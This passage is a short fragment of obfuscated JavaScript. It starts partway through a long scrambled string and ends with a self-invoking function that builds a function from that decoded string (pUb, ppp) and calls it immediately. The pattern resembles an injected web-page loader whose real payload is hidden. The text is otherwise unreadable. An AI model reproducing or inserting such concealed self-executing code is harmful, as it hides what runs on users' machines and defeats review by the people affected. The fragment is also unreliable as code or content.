o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
